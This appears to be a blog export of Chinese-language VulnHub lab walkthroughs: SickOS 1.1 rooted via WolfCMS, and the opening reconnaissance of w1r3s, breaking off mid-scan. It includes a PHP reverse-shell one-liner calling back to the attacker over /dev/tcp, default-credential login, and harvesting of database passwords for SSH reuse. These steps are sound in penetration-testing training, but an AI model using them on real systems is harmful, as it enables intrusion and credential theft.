<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sT -sV -O -p22,3128,8080 192.168.152.135</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:00 EDT</span><br><span class="line">Nmap scan report for 192.168.152.135</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">3128/tcp open   http-proxy Squid http proxy 3.1.19</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line">MAC Address: 00:0C:29:E9:D0:28 (VMware)</span><br><span class="line">Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 4.2 (92%), Linux 3.10 - 4.11 (92%), Linux 3.13 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%), Linux 3.2 - 3.10 (91%), Linux 3.2 - 3.16 (91%), Linux 3.13 - 3.16 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds</span><br></pre></td></tr></table></figure>
<p>暂时没有发现有价值的信息，先进行下一步扫描</p>
<h4 id="UDP扫描">UDP扫描</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -sU  192.168.152.135</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 03:06 EDT</span><br><span class="line">Nmap scan report for 192.168.152.135</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line">22/udp   open|filtered ssh</span><br><span class="line">3128/udp open|filtered ndl-aas</span><br><span class="line">8080/udp open|filtered http-alt</span><br><span class="line">MAC Address: 00:0C:29:E9:D0:28 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds</span><br></pre></td></tr></table></figure>
<h4 id="vuln脚本扫描">vuln脚本扫描</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ sudo nmap -script=vuln -p80,3128,8080 192.168.152.135</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 04:01 EDT</span><br><span class="line">Nmap scan report for 192.168.152.135</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">80/tcp   filtered http</span><br><span class="line">3128/tcp open     squid-http</span><br><span class="line">8080/tcp closed   http-proxy</span><br><span class="line">MAC Address: 00:0C:29:E9:D0:28 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再尝试一下目录爆破</p>
<h3 id="目录爆破">目录爆破</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ dirsearch -u 192.168.152.135                                        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-18_04-02-33.txt</span><br><span class="line">^[[B^[[B^[[B^[[B^[[B^[[B</span><br><span class="line">Target: http://192.168.152.135/</span><br><span class="line"></span><br><span class="line">[04:02:39] Starting:                                                                            </span><br><span class="line"></span><br><span class="line">Request timeout: http://192.168.152.135/</span><br><span class="line"></span><br><span class="line">Task Completed   </span><br></pre></td></tr></table></figure>
<p>请求超时，很明显我们使用的是本地实验环境，在局域网中出现这种请求超时明显是不正常的，通过前面的一些提示，也足以联想到是否与之前8080端口显示的代理相关</p>
<p>所以尝试使用3128端口的代理去再重新扫一次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ dirsearch -u 192.168.152.135 --proxy 192.168.152.135:3128</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/_192.168.152.135/_24-03-20_05-18-25.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.152.135/</span><br><span class="line"></span><br><span class="line">[05:18:31] Starting: </span><br><span class="line">[05:18:33] 403 -  245B  - /.ht_wsr.txt                                      </span><br><span class="line">[05:18:33] 403 -  243B  - /.htaccess.bak1                                   </span><br><span class="line">[05:18:33] 403 -  244B  - /.htaccess.sample                                 </span><br><span class="line">[05:18:33] 403 -  242B  - /.htaccess.save                                   </span><br><span class="line">[05:18:33] 403 -  243B  - /.htaccess.orig</span><br><span class="line">[05:18:33] 403 -  244B  - /.htaccess_orig                                   </span><br><span class="line">[05:18:33] 403 -  242B  - /.htaccessOLD</span><br><span class="line">[05:18:33] 403 -  243B  - /.htaccess_sc</span><br><span class="line">[05:18:33] 403 -  243B  - /.htaccessOLD2                                    </span><br><span class="line">[05:18:33] 403 -  239B  - /.html                                            </span><br><span class="line">[05:18:33] 403 -  239B  - /.htm</span><br><span class="line">[05:18:33] 403 -  242B  - /.htaccessBAK</span><br><span class="line">[05:18:33] 403 -  243B  - /.httr-oauth                                      </span><br><span class="line">[05:18:33] 403 -  247B  - /.htpasswd_test</span><br><span class="line">[05:18:33] 403 -  245B  - /.htaccess_extra                                  </span><br><span class="line">[05:18:33] 403 -  243B  - /.htpasswds                                       </span><br><span class="line">[05:18:46] 403 -  242B  - /cgi-bin/                                         </span><br><span class="line">[05:18:48] 200 -  109B  - /connect                                          </span><br><span class="line">[05:18:50] 403 -  241B  - /doc/api/                                         </span><br><span class="line">[05:18:50] 403 -  246B  - /doc/html/index.html</span><br><span class="line">[05:18:50] 403 -  239B  - /doc/</span><br><span class="line">[05:18:50] 403 -  248B  - /doc/en/changes.html                              </span><br><span class="line">[05:18:50] 403 -  247B  - /doc/stable.version</span><br><span class="line">[05:19:05] 200 -   58B  - /robots.txt                                       </span><br><span class="line">[05:19:06] 403 -  243B  - /server-status                                    </span><br><span class="line">[05:19:06] 403 -  243B  - /server-status/                                   </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed  </span><br></pre></td></tr></table></figure>
<p>这次成功扫出了基础的信息</p>
<h2 id="web渗透">web渗透</h2>
<p>将浏览器的代理设置到刚刚的ip和端口</p>
<p>访问到robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Dissalow: /wolfcms</span><br></pre></td></tr></table></figure>
<p>发现存在wolfcms的信息</p>
<p>访问connect，发现存在一些信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">print &quot;I Try to connect things very frequently\n&quot;</span><br><span class="line">print &quot;You may want to try my services&quot;</span><br></pre></td></tr></table></figure>
<p>通过搜索引擎找到一个管理员路径/wolfcms/?/admin</p>
<p>尝试弱口令，如果无果则选择爆破</p>
<p>通过admin，admin成功登录</p>
<p><img src="https://s2.loli.net/2024/03/20/iDpqszw1FNnLmTR.png" alt="vulnhub-sickos-1"></p>
<p>发现很多页面都存在可执行的php代码，尝试插入一段代码，一句话木马或者反弹shell都行</p>
<p>将这段代码插入页面，然后开一个监听端口，访问刚刚编辑后的页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.152.131/1234 0&gt;&amp;1&#x27;&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p>拿到一个权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ nc -lnvp 1234     </span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.152.131] from (UNKNOWN) [192.168.152.135] 53138</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 athlon i386 GNU/Linux</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ ip a</span><br><span class="line">ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN qlen 1000</span><br><span class="line">    link/ether 00:0c:29:e9:d0:28 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.152.135/24 brd 192.168.152.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fee9:d028/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>现在开始查找办法</p>
<p>查看当前目录，并且发现存在一个config.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@SickOs:/var/www/wolfcms$ ls</span><br><span class="line">ls</span><br><span class="line">CONTRIBUTING.md</span><br><span class="line">README.md</span><br><span class="line">composer.json</span><br><span class="line">config.php</span><br><span class="line">docs</span><br><span class="line">favicon.ico</span><br><span class="line">index.php</span><br><span class="line">public</span><br><span class="line">robots.txt</span><br><span class="line">wolf</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ cat config.php</span><br><span class="line">cat config.php</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Database information:</span><br><span class="line">// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)</span><br><span class="line">// The path can only be absolute path or :memory:</span><br><span class="line">// For more info look at: www.php.net/pdo</span><br><span class="line"></span><br><span class="line">// Database settings:</span><br><span class="line">define(&#x27;DB_DSN&#x27;, &#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;);</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line">define(&#x27;DB_PASS&#x27;, &#x27;john@123&#x27;);</span><br><span class="line">define(&#x27;TABLE_PREFIX&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">// Should Wolf produce PHP error messages for debugging?</span><br><span class="line">define(&#x27;DEBUG&#x27;, false);</span><br><span class="line"></span><br><span class="line">// Should Wolf check for updates on Wolf itself and the installed plugins?</span><br><span class="line">define(&#x27;CHECK_UPDATES&#x27;, true);</span><br><span class="line"></span><br><span class="line">// The number of seconds before the check for a new Wolf version times out in case of problems.</span><br><span class="line">define(&#x27;CHECK_TIMEOUT&#x27;, 3);</span><br><span class="line"></span><br><span class="line">// The full URL of your Wolf CMS install</span><br><span class="line">define(&#x27;URL_PUBLIC&#x27;, &#x27;/wolfcms/&#x27;);</span><br><span class="line"></span><br><span class="line">// Use httpS for the backend?</span><br><span class="line">// Before enabling this, please make sure you have a working HTTP+SSL installation.</span><br><span class="line">define(&#x27;USE_HTTPS&#x27;, false);</span><br><span class="line"></span><br><span class="line">// Use HTTP ONLY setting for the Wolf CMS authentication cookie?</span><br><span class="line">// This requests browsers to make the cookie only available through HTTP, so not javascript for example.</span><br><span class="line">// Defaults to false for backwards compatibility.</span><br><span class="line">define(&#x27;COOKIE_HTTP_ONLY&#x27;, false);</span><br><span class="line"></span><br><span class="line">// The virtual directory name for your Wolf CMS administration section.</span><br><span class="line">define(&#x27;ADMIN_DIR&#x27;, &#x27;admin&#x27;);</span><br><span class="line"></span><br><span class="line">// Change this setting to enable mod_rewrite. Set to &quot;true&quot; to remove the &quot;?&quot; in the URL.</span><br><span class="line">// To enable mod_rewrite, you must also change the name of &quot;_.htaccess&quot; in your</span><br><span class="line">// Wolf CMS root directory to &quot;.htaccess&quot;</span><br><span class="line">define(&#x27;USE_MOD_REWRITE&#x27;, false);</span><br><span class="line"></span><br><span class="line">// Add a suffix to pages (simluating static pages &#x27;.html&#x27;)</span><br><span class="line">define(&#x27;URL_SUFFIX&#x27;, &#x27;.html&#x27;);</span><br><span class="line"></span><br><span class="line">// Set the timezone of your choice.</span><br><span class="line">// Go here for more information on the available timezones:</span><br><span class="line">// http://php.net/timezones</span><br><span class="line">define(&#x27;DEFAULT_TIMEZONE&#x27;, &#x27;Asia/Calcutta&#x27;);</span><br><span class="line"></span><br><span class="line">// Use poormans cron solution instead of real one.</span><br><span class="line">// Only use if cron is truly not available, this works better in terms of timing</span><br><span class="line">// if you have a lot of traffic.</span><br><span class="line">define(&#x27;USE_POORMANSCRON&#x27;, false);</span><br><span class="line"></span><br><span class="line">// Rough interval in seconds at which poormans cron should trigger.</span><br><span class="line">// No traffic == no poormans cron run.</span><br><span class="line">define(&#x27;POORMANSCRON_INTERVAL&#x27;, 3600);</span><br><span class="line"></span><br><span class="line">// How long should the browser remember logged in user?</span><br><span class="line">// This relates to Login screen &quot;Remember me for xxx time&quot; checkbox at Backend Login screen</span><br><span class="line">// Default: 1800 (30 minutes)</span><br><span class="line">define (&#x27;COOKIE_LIFE&#x27;, 1800);  // 30 minutes</span><br><span class="line"></span><br><span class="line">// Can registered users login to backend using their email address?</span><br><span class="line">// Default: false</span><br><span class="line">define (&#x27;ALLOW_LOGIN_WITH_EMAIL&#x27;, false);</span><br><span class="line"></span><br><span class="line">// Should Wolf CMS block login ability on invalid password provided?</span><br><span class="line">// Default: true</span><br><span class="line">define (&#x27;DELAY_ON_INVALID_LOGIN&#x27;, true);</span><br><span class="line"></span><br><span class="line">// How long should the login blockade last?</span><br><span class="line">// Default: 30 seconds</span><br><span class="line">define (&#x27;DELAY_ONCE_EVERY&#x27;, 30); // 30 seconds</span><br><span class="line"></span><br><span class="line">// First delay starts after Nth failed login attempt</span><br><span class="line">// Default: 3</span><br><span class="line">define (&#x27;DELAY_FIRST_AFTER&#x27;, 3);</span><br><span class="line"></span><br><span class="line">// Secure token expiry time (prevents CSRF attacks, etc.)</span><br><span class="line">// If backend user does nothing for this time (eg. click some link) </span><br><span class="line">// his token will expire with appropriate notification</span><br><span class="line">// Default: 900 (15 minutes)</span><br><span class="line">define (&#x27;SECURE_TOKEN_EXPIRY&#x27;, 900);  // 15 minutes</span><br></pre></td></tr></table></figure>
<p>发现存在一个账户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line">define(&#x27;DB_PASS&#x27;, &#x27;john@123&#x27;);</span><br></pre></td></tr></table></figure>
<p>查看一下当前的用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@SickOs:/var/www/wolfcms$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/false</span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/false</span><br><span class="line">whoopsie:x:103:106::/nonexistent:/bin/false</span><br><span class="line">landscape:x:104:109::/var/lib/landscape:/bin/false</span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</span><br><span class="line">mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false</span><br></pre></td></tr></table></figure>
<p>挨个尝试是否能通过密码进行ssh登录操作</p>
<p>成功登录上sickos用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh sickos@192.168.152.135</span><br><span class="line">The authenticity of host &#x27;192.168.152.135 (192.168.152.135)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.152.135&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">sickos@192.168.152.135&#x27;s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">sickos@192.168.152.135&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Wed Mar 20 15:30:12 IST 2024</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Processes:           116</span><br><span class="line">  Usage of /:   4.3% of 28.42GB   Users logged in:     0</span><br><span class="line">  Memory usage: 12%               IP address for eth0: 192.168.152.135</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">124 packages can be updated.</span><br><span class="line">92 updates are security updates.</span><br><span class="line"></span><br><span class="line">New release &#x27;14.04.3 LTS&#x27; available.</span><br><span class="line">Run &#x27;do-release-upgrade&#x27; to upgrade to it.</span><br><span class="line"></span><br><span class="line">Last login: Tue Sep 22 08:32:44 2015</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Linux提权">Linux提权</h2>
<p>查看当前权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sickos@SickOs:~$ sudo -l</span><br><span class="line">[sudo] password for sickos: </span><br><span class="line">Matching Defaults entries for sickos on this host:</span><br><span class="line">    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User sickos may run the following commands on this host:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>
<p>很明显直接sudo su即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt</span><br><span class="line">^BIf you are viewing this!!</span><br><span class="line"></span><br><span class="line">ROOT!</span><br><span class="line"></span><br><span class="line">You have Succesfully completed SickOS1.1.</span><br><span class="line">Thanks for Trying</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>VulnHub</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-w1r3s-1.0.1</title>
    <url>/2024/03/11/VulnHub-w1r3s-1.0.1/</url>
    <content><![CDATA[<h1>VulnHub-w1r3s-1.0.1</h1>
<p>载入虚拟机后是一个未知账户，需要密码，流程开始</p>
<h2 id="信息搜集">信息搜集</h2>
<h3 id="查找主机">查找主机</h3>
<p>先查看自身主机，发现本地的ip为192.168.152.131，所在网段应该就是192.168.200.0/24</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ip a    </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:82:4e:1f brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.152.131/24 brd 192.168.152.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 1414sec preferred_lft 1414sec</span><br><span class="line">    inet6 fe80::3021:1752:2678:7550/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
<p>因此开始扫描该网段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -sn 192.168.152.0/24             </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:32 EDT</span><br><span class="line">Nmap scan report for 192.168.152.1</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.2</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:F0:8A (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.132</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line">MAC Address: 00:0C:29:60:2F:0A (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.254</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">MAC Address: 00:50:56:E9:C0:09 (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.131</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.92 seconds</span><br></pre></td></tr></table></figure>
<p><strong>注意点</strong></p>
<p>-sn参数是仅ping，而不进行端口扫描，-sP参数已废弃</p>
<p>使用arp-scan命令也能达到同样的效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$  sudo arp-scan -l     </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:82:4e:1f, IPv4: 192.168.152.131</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.152.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.152.2   00:50:56:fb:f0:8a       VMware, Inc.</span><br><span class="line">192.168.152.132 00:0c:29:60:2f:0a       VMware, Inc.</span><br><span class="line">192.168.152.254 00:50:56:e9:c0:09       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.004 seconds (127.74 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong></p>
<p>可以利用靶机上下线，确定自己的靶机IP</p>
<h3 id="端口扫描">端口扫描</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap --min-rate 10000 -p- 192.168.152.132   </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 22:55 EDT</span><br><span class="line">Nmap scan report for 192.168.152.132</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:60:2F:0A (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong></p>
<p>-p是指定端口参数，而-p-是指全端口扫描，防止存在信息遗漏</p>
<p>又学到一手，细节太多了，tql</p>
<p><strong>小技巧</strong></p>
<p>如果扫描过程中存在大量端口，可以的处理方法</p>
<p>首先在上述扫描的时候可以先将扫描参数保存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 192.168.152.132  -oA [路径]</span><br></pre></td></tr></table></figure>
<p>提取分割</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep open [路径] | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;</span><br></pre></td></tr></table></figure>
<p>指定变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ports=grep open [路径] | awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; | paste -sd &#x27;,&#x27;</span><br><span class="line">echo $ports</span><br></pre></td></tr></table></figure>
<h3 id="详细信息扫描">详细信息扫描</h3>
<h4 id="TCP扫描">TCP扫描</h4>
<ul>
<li>-sT：指定TCP协议</li>
<li>-sV：探测各服务的版本</li>
<li>-sC：使用默认脚本</li>
<li>-O：探测各操作系统的版本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.152.132</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 23:10 EDT</span><br><span class="line">Nmap scan report for 192.168.152.132</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.152.131</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</span><br><span class="line">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</span><br><span class="line">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:60:2F:0A (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 